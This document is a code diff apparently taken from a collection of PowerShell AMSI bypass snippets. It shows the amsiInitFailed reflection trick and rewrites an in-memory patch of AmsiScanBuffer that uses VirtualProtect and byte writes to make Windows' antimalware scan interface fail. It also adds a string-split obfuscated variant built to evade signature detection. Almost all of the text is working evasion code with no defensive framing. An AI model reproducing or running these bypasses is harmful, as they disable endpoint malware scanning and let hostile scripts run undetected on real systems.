@@ -8,12 +8,10 @@ $type.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)
 
 ===============================
 $Win32 = @"
-
 using System;
 using System.Runtime.InteropServices;
 
 public class Win32 {
-
     [DllImport("kernel32")]
     public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
@@ -22,17 +20,31 @@ public class Win32 {
 
     [DllImport("kernel32")]
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
 }
 "@
 
 Add-Type $Win32
 
-$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
-$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
-$p = 0
-[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
-$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
-===========================
+$Addr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
+$Patch = [Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)  # mov eax,0x80070057; ret
+[Win32]::VirtualProtect($Addr, [uint32]$Patch.Length, 0x40, [ref]0) | Out-Null
+for ($i = 0; $i -lt $Patch.Length; $i++) {
+  [System.Runtime.InteropServices.Marshal]::WriteByte($Addr, $i, $Patch[$i])
+}
+
+=============================
+
+#Obfuscated AMSI Bypass
+
+$e='u'+''+'si'+'ng Sy'+'ste'+'m;'+'
+u'+'sin'+'g Sys'+'tem.'+'Run'+'time.I'+'nteropS'+'ervices;'+'
+pub'+'lic cla'+'ss X{'+'[DllImport("kernel32")]public static extern IntPtr G(IntPtr h,string p);'+
+'[DllImport("kernel32")]public static extern IntPtr L(string n);'+
+'[DllImport("kernel32")]public static extern bool V(IntPtr a, UIntPtr l, uint n, out uint o);}';
+Add-Type $e;
+$p=[Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);
+$a=[X]::G([X]::L("amsi.dll"),"AmsiScanBuffer");
+[X]::V($a, [uint32]$p.Length, 0x40, [ref]0) | Out-Null;
+for($i=0;$i -lt $p.Length;$i++){[System.Runtime.InteropServices.Marshal]::WriteByte($a, $i, $p[$i])}
+
 
